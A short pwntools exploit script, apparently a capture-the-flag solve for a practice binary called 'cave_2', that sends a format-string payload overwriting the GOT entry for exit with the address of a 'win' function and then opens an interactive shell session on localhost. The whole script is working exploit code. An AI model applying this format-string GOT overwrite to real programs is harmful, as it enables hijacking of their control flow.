#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("cave_2")
rop = ROP(exe)

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("localhost", 7009)
    elif args.GDB:
        return gdb.debug([exe.path])
    else:
        return process([exe.path])


def main():
    r = conn()

    payload = fmtstr_payload(6, {exe.got['exit']: exe.symbols['win']})
    r.sendline(payload)
    
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

